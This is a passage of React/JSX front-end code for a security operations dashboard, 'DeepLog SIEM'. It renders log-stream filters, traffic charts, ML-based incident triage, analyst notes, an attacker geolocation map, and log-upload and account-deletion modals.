      <div className="soc-preloader-shell">
        <div className="soc-preloader-card">
          <div className="soc-preloader-radar">
            <Shield size={32} style={{ color: "var(--color-blue)" }} className="animate-pulse" />
          </div>
          <div className="soc-brand" style={{ marginBottom: 6 }}>
            <span className="soc-brand-title" style={{ fontSize: "16px" }}>DeepLog SIEM</span>
            <span className="soc-brand-badge">SOC CONSOLE v2.4</span>
          </div>
          <div className="soc-preloader-bar-bg">
            <div className="soc-preloader-bar-fill" />
          </div>
          <div className="soc-preloader-step">
            <Activity size={13} className="animate-spin" style={{ color: "var(--color-blue)" }} />
            <span>VERIFYING CRYPTOGRAPHIC SESSION & HARDWARE KEYS...</span>
          </div>
        </div>
      </div>
    );
  }

  // Preloader: Revoking session tokens on analyst logout
  if (isLoggingOut) {
    return (
      <div className="soc-preloader-shell">
        <div className="soc-preloader-card">
          <div
            className="soc-preloader-radar"
            style={{
              borderColor: "rgba(239, 68, 68, 0.4)",
              background: "radial-gradient(circle, rgba(239, 68, 68, 0.15) 0%, rgba(18, 23, 32, 0) 70%)",
            }}
          >
            <LogOut size={28} style={{ color: "var(--color-critical)" }} className="animate-pulse" />
          </div>
          <div className="soc-brand" style={{ marginBottom: 6 }}>
            <span className="soc-brand-title" style={{ fontSize: "16px" }}>DeepLog SIEM</span>
            <span
              className="soc-brand-badge"
              style={{ borderColor: "rgba(239, 68, 68, 0.4)", color: "var(--color-critical)" }}
            >
              SESSION TERMINATION
            </span>
          </div>
          <div className="soc-preloader-bar-bg">
            <div
              className="soc-preloader-bar-fill"
              style={{ background: "linear-gradient(90deg, var(--color-red), var(--color-amber))" }}
            />
          </div>
          <div className="soc-preloader-step" style={{ color: "var(--color-critical)" }}>
            <Activity size={13} className="animate-spin" />
            <span>REVOKING HttpOnly SECURITY TOKEN & TERMINATING SESSION...</span>
          </div>
        </div>
      </div>
    );
  }

  // Render Public Landing Page
  if (currentView === "landing") {
    return (
      <LandingPage
        onOpenConsole={() => setCurrentView("console")}
        onOpenLogin={() => setCurrentView("login")}
        onLogout={handleLogout}
        onDeleteAccount={() => {
          setDeleteAccountError("");
          setDeleteConfirmText("");
          setShowDeleteAccountModal(true);
        }}
        isAuthenticated={isAuthenticated}
        activeAnalyst={isAuthenticated ? activeAnalyst : null}
        wsConnected={wsConnected}
        totalEvents={totalEvents}
        threatsCount={criticalThreats + warnings}
      />
    );
  }

  // Render Hardened Analyst Login Page
  if (currentView === "login") {
    return (
      <LoginPage
        onLoginSuccess={(analyst) => {
          setIsAuthenticated(true);
          setActiveAnalyst(analyst);
          setCurrentView("console");
        }}
        onBackToLanding={() => setCurrentView("landing")}
        onDirectConsole={() => setCurrentView("console")}
      />
    );
  }

  return (
    <div className="soc-shell">
      {/* Enterprise SOC Workstation Top Bar */}
      <header className="soc-header">
        <div className="soc-brand">
          <div className="soc-brand-icon">
            <Shield size={17} />
          </div>
          <span className="soc-brand-title">DeepLog SIEM</span>
          <span className="soc-brand-badge">SOC CONSOLE v2.4</span>
        </div>

        {/* Live System Telemetry */}
        <div className="soc-telemetry-bar">
          <div className="telemetry-item">
            <span className={`telemetry-dot ${wsConnected ? "" : "offline"}`} />
            <span>{wsConnected ? "WS STREAM LIVE" : "CONNECTING..."}</span>
          </div>
          <div className="telemetry-item">
            <Clock size={13} />
            <span>Latency: <strong>{latencyMs}ms</strong></span>
          </div>
          <div className="telemetry-item">
            <Activity size={13} />
            <span>Throughput: <strong>{throughputEps} EPS</strong></span>
          </div>
          <div className="telemetry-item">
            <Server size={13} />
            <span>Engine: <strong>DeepLog-RF-1.0</strong></span>
          </div>
          <div className="telemetry-item" title="Sliding-window token bucket defense active: 250 req/min (Ingest), 10 req/min (Auth)">
            <ShieldCheck size={13} style={{ color: "var(--color-emerald)" }} />
            <span>Rate Limiter: <strong>Active (250/m)</strong></span>
          </div>
        </div>

        {/* Workstation Actions */}
        <div className="soc-header-actions">
          {/* Return to Landing Overview */}
          <button
            className="btn-secondary"
            onClick={() => setCurrentView("landing")}
            title="Return to Public Overview & Landing Page"
          >
            <Globe size={13} />
            <span>Landing</span>
          </button>

          {/* Quick Real ML Ingestion Triggers */}
          <div className="probe-actions">
            <button
              className="btn-secondary probe-btn"
              onClick={() => injectLiveProbe("sqli")}
              disabled={probing}
              title="Inject live SQL Injection probe into ML classification engine"
            >
              <ShieldAlert size={12} style={{ color: "var(--color-critical)" }} />
              <span>Probe SQLi</span>
            </button>
            <button
              className="btn-secondary probe-btn"
              onClick={() => injectLiveProbe("xss")}
              disabled={probing}
              title="Inject live XSS probe into ML classification engine"
            >
              <Zap size={12} style={{ color: "var(--color-amber)" }} />
              <span>Probe XSS</span>
            </button>
            <button
              className="btn-secondary probe-btn"
              onClick={() => injectLiveProbe("normal")}
              disabled={probing}
              title="Inject live normal HTTP probe into ML classification engine"
            >
              <CheckCircle2 size={12} style={{ color: "var(--color-safe)" }} />
              <span>Probe Safe</span>
            </button>
          </div>

          {probeNotice && (
            <div className="probe-badge" style={{ display: "inline-flex", alignItems: "center", gap: 6 }}>
              <span>{probeNotice}</span>
              <button
                type="button"
                onClick={() => setProbeNotice(null)}
                style={{
                  background: "transparent",
                  border: "none",
                  color: "inherit",
                  cursor: "pointer",
                  display: "flex",
                  alignItems: "center",
                  padding: "0 2px",
                  opacity: 0.8,
                }}
                title="Clear notification"
              >
                <X size={11} />
              </button>
            </div>
          )}

          <button
            className={`btn-secondary ${!isStreaming ? "active" : ""}`}
            onClick={toggleStream}
            title={isStreaming ? "Pause real-time stream" : "Resume real-time stream"}
          >
            {isStreaming ? <Pause size={14} /> : <Play size={14} />}
            <span>{isStreaming ? "Pause Feed" : "Resume Feed"}</span>
          </button>

          <button
            className="btn-primary"
            onClick={() => {
              setUploadError("");
              setShowUploadModal(true);
            }}
            title="Ingest server log file (.csv, .log, .txt)"
          >
            <Upload size={14} />
            <span>Ingest Log</span>
          </button>

          <button
            className="btn-secondary"
            onClick={downloadIncidentReport}
            title="Download formatted SOC incident report"
          >
            <Download size={14} />
            <span>Export Report</span>
          </button>

          {/* Active Analyst Identification & Lock */}
          <div
            style={{
              display: "flex",
              alignItems: "center",
              gap: 7,
              padding: "3px 8px",
              background: "rgba(255, 255, 255, 0.03)",
              border: "1px solid var(--border-color)",
              borderRadius: 4,
            }}
          >
            <div
              style={{
                width: 22,
                height: 22,
                borderRadius: "50%",
                background: "rgba(96, 165, 250, 0.18)",
                color: "var(--color-blue)",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontSize: "11px",
                fontWeight: 700,
              }}
            >
              {activeAnalyst.name.charAt(0)}
            </div>
            <div style={{ display: "flex", flexDirection: "column", lineHeight: 1.1 }}>
              <span style={{ fontSize: "11px", fontWeight: 600, color: "var(--text-primary)" }}>
                {activeAnalyst.name}
              </span>
              <span style={{ fontSize: "9px", fontFamily: "var(--font-mono)", color: "var(--text-muted)" }}>
                {activeAnalyst.role}
              </span>
            </div>
            <button
              className="btn-secondary logout-btn"
              style={{
                display: "flex",
                alignItems: "center",
                gap: 4,
                padding: "3px 8px",
                fontSize: "11px",
                marginLeft: 4,
                color: "var(--color-critical)",
                borderColor: "rgba(239, 68, 68, 0.3)",
              }}
              onClick={handleLogout}
              title="Terminate Session & Sign Out"
            >
              <LogOut size={11} />
              <span>Sign Out</span>
            </button>
            <button
              className="btn-secondary delete-account-btn"
              style={{
                display: "flex",
                alignItems: "center",
                gap: 4,
                padding: "3px 8px",
                fontSize: "11px",
                marginLeft: 4,
                color: "var(--color-critical)",
                background: "rgba(239, 68, 68, 0.08)",
                borderColor: "rgba(239, 68, 68, 0.35)",
              }}
              onClick={() => {
                setDeleteAccountError("");
                setDeleteConfirmText("");
                setShowDeleteAccountModal(true);
              }}
              title="Permanently Delete Analyst Account"
            >
              <Trash2 size={11} />
              <span>Delete Account</span>
            </button>
          </div>
        </div>
      </header>

      {/* 3-Column Asymmetrical Responsive Grid */}
      <main className="soc-grid-layout">
        {/* ========================================================= */}
        {/* LEFT COLUMN (30%): Live Log Stream */}
        {/* ========================================================= */}
        <section className="soc-col">
          <div className="panel-header">
            <h2 className="panel-title">
              <Terminal size={15} style={{ color: "var(--color-blue)" }} />
              <span>Live Log Stream</span>
            </h2>
            <span className="panel-meta">{filteredLogs.length} events filtered</span>
          </div>

          <div className="log-stream-container">
            {/* Sticky Filter & Search Bar */}
            <div className="log-filter-sticky">
              <input
                type="text"
                className="log-search-input"
                placeholder="Filter by IP, endpoint, message, or host..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />

              <div className="filter-row">
                <div className="filter-pills">
                  <button
                    className={`filter-pill ${severityFilter === "ALL" ? "active" : ""}`}
                    onClick={() => setSeverityFilter("ALL")}
                  >
                    ALL
                  </button>
                  <button
                    className={`filter-pill critical ${severityFilter === "CRITICAL" ? "active" : ""}`}
                    onClick={() => setSeverityFilter("CRITICAL")}
                  >
                    CRITICAL
                  </button>
                  <button
                    className={`filter-pill warning ${severityFilter === "WARNING" ? "active" : ""}`}
                    onClick={() => setSeverityFilter("WARNING")}
                  >
                    WARNING
                  </button>
                  <button
                    className={`filter-pill normal ${severityFilter === "NORMAL" ? "active" : ""}`}
                    onClick={() => setSeverityFilter("NORMAL")}
                  >
                    NORMAL
                  </button>
                </div>

                <button
                  className="btn-icon"
                  onClick={() => {
                    setSearchQuery("");
                    setSeverityFilter("ALL");
                  }}
                  title="Reset filters"
                >
                  <RotateCcw size={13} />
                </button>
              </div>
            </div>

            {/* Scrollable Dense Log Feed */}
            <div className="log-feed-scroll">
              {filteredLogs.map((log) => {
                const isSelected = selectedLog?.id === log.id;
                const severityClass =
                  log.severity === "CRITICAL"
                    ? "severity-critical"
                    : log.severity === "WARNING"
                    ? "severity-warning"
                    : "severity-normal";

                const tagClass =
                  log.severity === "CRITICAL"
                    ? "tag-critical"
                    : log.severity === "WARNING"
                    ? "tag-warning"
                    : "tag-normal";

                return (
                  <div
                    key={log.id}
                    className={`log-entry-row ${severityClass} ${isSelected ? "selected" : ""} ${
                      log.isNew ? "is-new-malicious" : ""
                    }`}
                    onClick={() => setSelectedLogId(log.id)}
                  >
                    <div className="log-content-wrap">
                      <div className="log-header-line">
                        <span className={`severity-tag ${tagClass}`}>{log.severity}</span>
                        <span className="log-timestamp">{log.timestamp.slice(11, 19)}</span>
                        <span className="log-ip">{log.source_ip}</span>
                        <span className="log-status-badge">HTTP {log.status_code}</span>
                      </div>
                      <div className="log-body-line">
                        <SafeLogViewer
                          content={log.message}
                          highlightThreat={log.severity === "CRITICAL"}
                        />
                      </div>
                      {log.location && log.location !== "null" && (
                        <div className="log-geo-inline">
                          <span>📍 {log.location}</span>
                        </div>
                      )}
                    </div>
                  </div>
                );
              })}

              {filteredLogs.length === 0 && (
                <div className="soc-empty-state-box">
                  <div className="soc-empty-icon-wrap warning">
                    <SearchX size={26} />
                  </div>
                  <span className="soc-empty-title">NO MATCHING TELEMETRY LOGS</span>
                  <p className="soc-empty-desc">
                    {searchQuery || severityFilter !== "ALL"
                      ? `No ingested events match query "${searchQuery}" with severity filter "${severityFilter}".`
                      : "The ingestion stream buffer is currently empty. Ingest a server log or trigger real-time ML probes."}
                  </p>
                  <div className="soc-empty-actions">
                    {(searchQuery || severityFilter !== "ALL") && (
                      <button
                        className="btn-secondary"
                        onClick={() => {
                          setSearchQuery("");
                          setSeverityFilter("ALL");
                        }}
                      >
                        <RotateCcw size={12} />
                        <span>Reset Filters</span>
                      </button>
                    )}
                    <button className="btn-secondary" onClick={() => injectLiveProbe("sqli")}>
                      <Zap size={12} style={{ color: "var(--color-critical)" }} />
                      <span>Inject SQLi Probe</span>
                    </button>
                    <button className="btn-primary" onClick={() => setShowUploadModal(true)}>
                      <Upload size={12} />
                      <span>Ingest Log</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </section>

        {/* ========================================================= */}
        {/* CENTER COLUMN (45%): Analytics & Triage */}
        {/* ========================================================= */}
        <section className="soc-col">
          <div className="panel-header">
            <h2 className="panel-title">
              <Activity size={15} style={{ color: "var(--color-emerald)" }} />
              <span>Security Analytics & Triage</span>
            </h2>
            <span className="panel-meta">Last 60 Minutes · Active Triage</span>
          </div>

          <div className="center-column-container">
            {/* Top: Normal vs Malicious Traffic Time-Series Area Chart */}
            <div className="chart-panel-soc">
              <div className="chart-header">
                <h3 className="chart-title">Traffic Classification Volume (Over Time)</h3>
                <div className="chart-legend-soc">
                  <span>
                    <i className="legend-dot-soc" style={{ backgroundColor: "var(--color-emerald)" }} />
                    Normal Traffic
                  </span>
                  <span>
                    <i className="legend-dot-soc" style={{ backgroundColor: "var(--color-red)" }} />
                    Malicious Ingress
                  </span>
                </div>
              </div>

              <div style={{ height: 160, width: "100%" }}>
                <ResponsiveContainer width="100%" height="100%">
                  <AreaChart data={timeSeriesData} margin={{ top: 10, right: 10, left: -24, bottom: 0 }}>
                    <defs>
                      <linearGradient id="normalSocFill" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="0%" stopColor="#10B981" stopOpacity={0.4} />
                        <stop offset="100%" stopColor="#10B981" stopOpacity={0.0} />
                      </linearGradient>
                      <linearGradient id="maliciousSocFill" x1="0" y1="0" x2="0" y2="1">
                        <stop offset="0%" stopColor="#EF4444" stopOpacity={0.45} />
                        <stop offset="100%" stopColor="#EF4444" stopOpacity={0.0} />
                      </linearGradient>
                    </defs>
                    <CartesianGrid stroke="rgba(255,255,255,0.06)" vertical={false} />
                    <XAxis dataKey="time" stroke="#64748B" tick={{ fontSize: 10 }} axisLine={false} tickLine={false} />
                    <YAxis stroke="#64748B" tick={{ fontSize: 10 }} axisLine={false} tickLine={false} />
                    <Tooltip
                      contentStyle={{
                        backgroundColor: "#1E2530",
                        borderColor: "#3D4454",
                        borderRadius: "6px",
                        color: "#F1F5F9",
                        fontSize: "11px",
                        fontFamily: "var(--font-mono)",
                      }}
                    />
                    <Area
                      type="monotone"
                      dataKey="normal"
                      name="Normal Requests"
                      stroke="#10B981"
                      fill="url(#normalSocFill)"
                      strokeWidth={2}
                    />
                    <Area
                      type="monotone"
                      dataKey="malicious"
                      name="Malicious Threats"
                      stroke="#EF4444"
                      fill="url(#maliciousSocFill)"
                      strokeWidth={2}
                    />
                  </AreaChart>
                </ResponsiveContainer>
              </div>
            </div>

            {/* Middle: Key Metrics Cards */}
            <div className="metrics-grid-soc">
              <div className="metric-card-soc">
                <span className="metric-label-soc">
                  <span>TOTAL EVENTS</span>
                  <Server size={13} />
                </span>
                <span className="metric-value-soc">{totalEvents.toLocaleString()}</span>
                <span className="metric-foot-soc">Ingested in active session</span>
              </div>

              <div className="metric-card-soc">
                <span className="metric-label-soc">
                  <span>THREATS BLOCKED</span>
                  <ShieldAlert size={13} style={{ color: "var(--color-red)" }} />
                </span>
                <span className="metric-value-soc danger">{criticalThreats}</span>
                <span className="metric-foot-soc">Confirmed malicious attempts</span>
              </div>

              <div className="metric-card-soc">
                <span className="metric-label-soc">
                  <span>SUSPICIOUS</span>
                  <AlertTriangle size={13} style={{ color: "var(--color-amber)" }} />
                </span>
                <span className="metric-value-soc warning">{warnings}</span>
                <span className="metric-foot-soc">Anomalies under observation</span>
              </div>

              <div className="metric-card-soc">
                <span className="metric-label-soc">
                  <span>SAFE TRAFFIC</span>
                  <CheckCircle2 size={13} style={{ color: "var(--color-emerald)" }} />
                </span>
                <span className="metric-value-soc success">{normalCount}</span>
                <span className="metric-foot-soc">Clean authorized volume</span>
              </div>
            </div>

            {/* Bottom: Detailed View of the Selected Log Entry */}
            {selectedLog ? (
              <div className="triage-panel-soc">
                <div className="triage-header">
                  <div className="triage-title-group">
                    <span
                      className={`severity-tag ${
                        selectedLog.severity === "CRITICAL"
                          ? "tag-critical"
                          : selectedLog.severity === "WARNING"
                          ? "tag-warning"
                          : "tag-normal"
                      }`}
                    >
                      {selectedLog.severity}
                    </span>
                    <h3 className="chart-title" style={{ fontFamily: "var(--font-mono)" }}>
                      Incident #{selectedLog.id} · {selectedLog.attack_type || selectedLog.method}
                    </h3>
                  </div>
                  <span className="panel-meta">{selectedLog.timestamp}</span>
                </div>

                <div className="triage-content">
                  {/* Technical Metadata Grid */}
                  <div className="detail-grid-soc">
                    <div className="detail-cell">
                      <span className="detail-cell-label">Source IP</span>
                      <span className="detail-cell-value" style={{ color: "var(--color-blue)" }}>
                        {selectedLog.source_ip}
                      </span>
                    </div>

                    <div className="detail-cell">
                      <span className="detail-cell-label">HTTP Method</span>
                      <span className="detail-cell-value">{selectedLog.method}</span>
                    </div>

                    <div className="detail-cell">
                      <span className="detail-cell-label">HTTP Status</span>
                      <span className="detail-cell-value">{selectedLog.status_code}</span>
                    </div>

                    <div className="detail-cell">
                      <span className="detail-cell-label">Origin Location</span>
                      <span className="detail-cell-value" style={{ color: "var(--color-purple)" }}>
                        {selectedLog.location || "Internal / RFC1918"}
                      </span>
                    </div>

                    <div className="detail-cell" style={{ gridColumn: "span 2" }}>
                      <span className="detail-cell-label">Target Endpoint</span>
                      <span className="detail-cell-value" title={selectedLog.endpoint}>
                        <SafeLogViewer content={selectedLog.endpoint} />
                      </span>
                    </div>

                    <div className="detail-cell" style={{ gridColumn: "span 2" }}>
                      <span className="detail-cell-label">Network ASN / Provider</span>
                      <span className="detail-cell-value">{selectedLog.asn || "Unassigned Transit"}</span>
                    </div>
                  </div>

                  {/* ML Model Signals & Feature Assessment */}
                  <div className="ml-assessment-box">
                    <div className="ml-assessment-header">
                      <span>
                        ML Model Verdict:{" "}
                        <strong
                          style={{
                            color:
                              selectedLog.severity === "CRITICAL"
                                ? "var(--color-red)"
                                : selectedLog.severity === "WARNING"
                                ? "var(--color-amber)"
                                : "var(--color-emerald)",
                          }}
                        >
                          {selectedLog.severity === "CRITICAL"
                            ? "MALICIOUS (High Confidence)"
                            : selectedLog.severity === "WARNING"
                            ? "SUSPICIOUS / ELEVATED"
                            : "SAFE / BENIGN"}
                        </strong>
                      </span>
                      <span style={{ fontFamily: "var(--font-mono)" }}>
                        Confidence: <strong>{selectedLog.probability}%</strong> (Threshold: 45.0%)
                      </span>
                    </div>

                    <div className="confidence-bar-track">
                      <div
                        className="confidence-bar-fill"
                        style={{
                          width: `${Math.min(100, Math.max(5, selectedLog.probability))}%`,
                          backgroundColor:
                            selectedLog.probability > 75
                              ? "var(--color-red)"
                              : selectedLog.probability > 45
                              ? "var(--color-amber)"
                              : "var(--color-emerald)",
                        }}
                      />
                    </div>

                    {selectedLog.features && Object.keys(selectedLog.features).length > 0 && (
                      <div className="signals-chip-list">
                        {Object.entries(selectedLog.features).map(([key, val]) => (
                          <span key={key} className="signal-chip-soc">
                            <span style={{ color: "var(--text-muted)" }}>{key}:</span>
                            <span style={{ color: Number(val) > 0 ? "var(--color-red)" : "var(--text-primary)" }}>
                              {String(val)}
                            </span>
                          </span>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* Analyst Notes Section */}
                  <div className="analyst-notes-section">
                    <div className="analyst-notes-header">
                      <span style={{ fontSize: "12px", fontWeight: 600 }}>
                        Analyst Investigation Notes (Incident #{selectedLog.id})
                      </span>
                      <span className="panel-meta">Saved to incident registry</span>
                    </div>

                    <textarea
                      className="notes-textarea"
                      placeholder="Add investigation findings, triage status, firewall quarantine actions, or ISP escalations..."
                      value={currentNoteText}
                      onChange={(e) => setCurrentNoteText(e.target.value)}
                    />

                    <div style={{ display: "flex", justifyContent: "flex-end" }}>
                      <button className="btn-primary" onClick={handleSaveNote} disabled={!currentNoteText.trim()}>
                        <Check size={13} />
                        <span>Save Note</span>
                      </button>
                    </div>

                    {/* Saved Notes History for this incident */}
                    {notes.filter((n) => n.eventId === selectedLog.id).length > 0 ? (
                      <div className="saved-notes-list">
                        {notes
                          .filter((n) => n.eventId === selectedLog.id)
                          .map((n) => (
                            <div key={n.id} className="saved-note-item">
                              <div className="saved-note-meta">
                                <span>{n.author}</span>
                                <span>{n.timestamp}</span>
                              </div>
                              <div style={{ color: "#E2E8F0" }}>{n.text}</div>
                            </div>
                          ))}
                      </div>
                    ) : (
                      <div className="soc-empty-notes">
                        <FileText size={13} style={{ color: "var(--color-blue)" }} />
                        <span>No notes logged for Incident #{selectedLog.id} yet. Use the field above to record investigation findings.</span>
                      </div>
                    )}
                  </div>

                  {/* Quick Triage Actions */}
                  <div className="triage-actions-bar">
                    <button className="btn-danger" onClick={() => alert(`IP ${selectedLog.source_ip} queued for boundary firewall quarantine.`)}>
                      <ShieldAlert size={13} />
                      <span>Quarantine IP</span>
                    </button>
                    <button className="btn-secondary" onClick={copyCurl}>
                      {copiedCurl ? <Check size={13} /> : <Copy size={13} />}
                      <span>{copiedCurl ? "cURL Copied" : "Copy cURL"}</span>
                    </button>
                    <button className="btn-secondary" onClick={() => alert(`Host ${selectedLog.source_ip} added to review queue.`)}>
                      <span>Tag False Positive</span>
                    </button>
                  </div>
                </div>
              </div>
            ) : (
              <div className="soc-empty-detail-panel">
                <div className="soc-empty-icon-wrap">
                  <MousePointerClick size={28} />
                </div>
                <span className="soc-empty-title">NO INCIDENT SELECTED FOR DEEP TRIAGE</span>
                <p className="soc-empty-desc">
                  Select any security event from the Live Log Stream on the left to inspect 24-dimensional heuristic ML feature assessments, payload decoding, and quarantine actions.
                </p>
                {logs[0] && (
                  <button className="btn-secondary" onClick={() => setSelectedLogId(logs[0].id)}>
                    <Terminal size={12} style={{ color: "var(--color-blue)" }} />
                    <span>Inspect Latest Ingress (#{logs[0].id})</span>
                  </button>
                )}
              </div>
            )}
          </div>
        </section>

        {/* ========================================================= */}
        {/* RIGHT COLUMN (25%): Attacker Geolocation */}
        {/* ========================================================= */}
        <section className="soc-col">
          <div className="panel-header">
            <h2 className="panel-title">
              <Globe size={15} style={{ color: "var(--color-purple)" }} />
              <span>Attacker Geolocation</span>
            </h2>
            <span className="panel-meta">{geoPins.length} attack origins</span>
          </div>

          <div className="right-column-container">
            {/* Interactive Dark Map with Purple Pins (#8B5CF6) */}
            <div className="geo-map-box">
              <img src="/world-map.png" alt="World map" className="world-svg-bg" />

              {/* Render Purple Pins for Attack Coordinates */}
              {geoPins.map((pin) => {
                // Map lat/long [-180..180, -90..90] to percentage on canvas
                const left = `${Math.min(96, Math.max(4, ((pin.longitude + 180) / 360) * 100))}%`;
                const top = `${Math.min(94, Math.max(6, ((90 - pin.latitude) / 180) * 100))}%`;

                return (
                  <div
                    key={`${pin.country}-${pin.city}`}
                    className="map-pin-purple"
                    style={{ left, top }}
                    onClick={() => setSelectedGeoPin(pin)}
                    title={`${pin.city}, ${pin.country} (${pin.attacks} attacks)`}
                  >
                    <div className="pin-pulse" />
                    <div className="pin-core" />
                  </div>
                );
              })}

              {/* Tooltip on Clicking Pin */}
              {selectedGeoPin && (
                <div className="map-tooltip-soc">
                  <div>
                    <span style={{ color: "var(--text-muted)" }}>Source IP:</span>{" "}
                    <strong style={{ color: "var(--color-blue)" }}>{selectedGeoPin.ip}</strong>
                  </div>
                  <div>
                    <span style={{ color: "var(--text-muted)" }}>Threat Level:</span>{" "}
                    <strong style={{ color: "var(--color-red)" }}>{selectedGeoPin.threat_level}</strong>
                  </div>
                  <div>
                    <span style={{ color: "var(--text-muted)" }}>Location:</span>{" "}
                    <span>
                      {selectedGeoPin.city}, {selectedGeoPin.country}
                    </span>
                  </div>
                  <div>
                    <span style={{ color: "var(--text-muted)" }}>Attacks:</span>{" "}
                    <strong style={{ color: "var(--color-purple)" }}>{selectedGeoPin.attacks}</strong>
                  </div>
                  <div style={{ gridColumn: "span 2", borderTop: "1px solid #333D4D", paddingTop: 4, marginTop: 2 }}>
                    <span style={{ color: "var(--text-muted)" }}>ASN:</span> {selectedGeoPin.asn}
                  </div>
                </div>
              )}
            </div>

            {/* Attacker Origin Rankings */}
            <div className="panel-header" style={{ borderTop: "1px solid var(--border-subtle)", background: "#181D24" }}>
              <span style={{ fontSize: "11px", fontWeight: 600, color: "var(--text-secondary)", letterSpacing: "0.04em" }}>
                TOP ATTACKING ORIGINS
              </span>
              <span className="panel-meta">Confirmed Attacker IPs</span>
            </div>

            <div className="attacker-table-container">
              {topAttackers.map((origin, idx) => (
                <div
                  key={`${origin.country}-${origin.city}`}
                  className="attacker-row-soc"
                  onClick={() => {
                    const pin = geoPins.find((p) => p.city === origin.city && p.country === origin.country);
                    if (pin) setSelectedGeoPin(pin);
                  }}
                >
                  <div className="attacker-origin">
                    <span style={{ color: "var(--text-muted)", width: 18 }}>0{idx + 1}</span>
                    <MapPin size={13} style={{ color: "var(--color-purple)" }} />
                    <span style={{ fontWeight: 500 }}>
                      {origin.city}, {origin.country}
                    </span>
                  </div>

                  <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <span className="attacker-badge-purple">{origin.attacks} attacks</span>
                    <span
                      className={`severity-tag ${
                        origin.risk === "Critical" ? "tag-critical" : "tag-warning"
                      }`}
                      style={{ fontSize: "9px" }}
                    >
                      {origin.risk}
                    </span>
                  </div>
                </div>
              ))}

              {topAttackers.length === 0 && (
                <div className="soc-empty-state-box" style={{ margin: "14px 12px" }}>
                  <div className="soc-empty-icon-wrap purple">
                    <ShieldCheck size={22} />
                  </div>
                  <span className="soc-empty-title">PERIMETER SECURE</span>
                  <p className="soc-empty-desc">
                    No confirmed attacker IP coordinates logged in the current inspection window.
                  </p>
                </div>
              )}
            </div>
          </div>
        </section>
      </main>

      {/* Log Ingest Modal */}
      {showUploadModal && (
        <div
          className="modal-overlay-soc"
          onClick={() => {
            setUploadError("");
            setShowUploadModal(false);
          }}
        >
          <div className="modal-box-soc" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header-soc">
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <Upload size={16} style={{ color: "var(--color-blue)" }} />
                <h3 style={{ margin: 0, fontSize: "15px", fontWeight: 600 }}>Ingest Server Log File</h3>
              </div>
              <button
                className="btn-icon"
                onClick={() => {
                  setUploadError("");
                  setShowUploadModal(false);
                }}
              >
                <X size={15} />
              </button>
            </div>

            <div className="modal-body-soc">
              <p style={{ margin: 0, color: "var(--text-secondary)", fontSize: "13px" }}>
                Upload server logs (CSV, Nginx/Apache Combined access.log, or syslog). DeepLog will parse every line,
                generate 24 ML features, classify malicious vectors, and enrich geo-origins.
              </p>

              <div
                className="dropzone-soc"
                onClick={() => {
                  if (uploadError) setUploadError("");
                  fileInputRef.current?.click();
                }}
                onDragOver={(e) => e.preventDefault()}
                onDrop={(e) => {
                  e.preventDefault();
                  if (uploadError) setUploadError("");
                  if (e.dataTransfer.files[0]) handleFileUpload(e.dataTransfer.files[0]);
                }}
              >
                <input
                  type="file"
                  ref={fileInputRef}
                  style={{ display: "none" }}
                  accept=".csv,.log,.txt,text/plain,text/csv"
                  onChange={(e) => {
                    if (uploadError) setUploadError("");
                    if (e.target.files?.[0]) handleFileUpload(e.target.files[0]);
                  }}
                />
                <Upload size={28} style={{ color: "var(--color-blue)" }} />
                <strong style={{ fontSize: "14px" }}>Select or drag and drop server log</strong>
                <span style={{ fontSize: "11px", color: "var(--text-muted)" }}>
                  Supported formats: CSV, Apache/Nginx Combined Log, Syslog
                </span>
              </div>

              {uploading && (
                <div style={{ display: "flex", alignItems: "center", gap: 10, color: "var(--color-blue)", fontSize: "12px" }}>
                  <Activity size={14} className="animate-spin" />
                  <span>Processing logs through Random Forest classifier & GeoIP resolver...</span>
                </div>
              )}

              {uploadError && (
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    gap: 10,
                    padding: "8px 12px",
                    background: "rgba(239, 68, 68, 0.1)",
                    border: "1px solid rgba(239, 68, 68, 0.35)",
                    borderRadius: 6,
                    color: "var(--color-red)",
                    fontSize: "12px",
                  }}
                >
                  <div style={{ display: "flex", alignItems: "center", gap: 8, flex: 1 }}>
                    <AlertTriangle size={15} style={{ flexShrink: 0 }} />
                    <span>{uploadError}</span>
                  </div>
                  <button
                    type="button"
                    onClick={() => setUploadError("")}
                    style={{
                      background: "rgba(239, 68, 68, 0.18)",
                      border: "1px solid rgba(239, 68, 68, 0.35)",
                      color: "var(--color-red)",
                      borderRadius: 4,
                      padding: "2px 8px",
                      display: "flex",
                      alignItems: "center",
                      gap: 4,
                      fontSize: "11px",
                      cursor: "pointer",
                      fontFamily: "var(--font-mono)",
                    }}
                    title="Clear error message"
                  >
                    <X size={12} />
                    <span>Clear</span>
                  </button>
                </div>
              )}

              <div style={{ display: "flex", justifyContent: "flex-end", gap: 8 }}>
                <button
                  className="btn-secondary"
                  onClick={() => {
                    setUploadError("");
                    setShowUploadModal(false);
                  }}
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Delete Account Danger Confirmation Modal */}
      {showDeleteAccountModal && (
        <div
          className="modal-overlay-soc"
          onClick={() => {
            if (!isDeletingAccount) {
              setDeleteAccountError("");
              setShowDeleteAccountModal(false);
            }
          }}
        >
          <div
            className="modal-box-soc"
            style={{ maxWidth: 500, borderColor: "rgba(239, 68, 68, 0.4)" }}
            onClick={(e) => e.stopPropagation()}
          >
            <div className="modal-header-soc" style={{ borderColor: "rgba(239, 68, 68, 0.3)" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8, color: "var(--color-critical)" }}>
                <Trash2 size={16} />
                <h3 style={{ margin: 0, fontSize: "15px", fontWeight: 700 }}>
                  Permanently Delete Analyst Account
                </h3>
              </div>
              <button
                className="btn-icon"
                disabled={isDeletingAccount}
                onClick={() => {
                  setDeleteAccountError("");
                  setShowDeleteAccountModal(false);
                }}
              >
                <X size={15} />
              </button>
            </div>

            <div className="modal-body-soc" style={{ display: "flex", flexDirection: "column", gap: 14 }}>
              <div
                style={{
                  padding: "12px 14px",
                  background: "rgba(239, 68, 68, 0.09)",
